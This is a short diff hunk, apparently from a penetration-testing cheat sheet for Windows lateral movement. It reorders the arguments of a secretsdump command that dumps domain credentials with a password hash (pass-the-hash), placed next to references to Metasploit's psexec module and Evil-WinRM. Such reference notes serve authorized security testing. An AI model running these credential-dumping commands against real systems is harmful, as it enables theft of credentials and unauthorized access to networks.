@@ -29,7 +29,7 @@ exploit/windows/smb/psexec
 ```
 (Secretsdump) Dumping credentials using hashes
 ```bash
-secretsdump <DOMAIN>/<USER>:@<IP> -hashes <HASH>
+secretsdump  -hashes <HASH> <DOMAIN>/<USER>@<IP>
 ```
 Evil-winrm
 ```bash
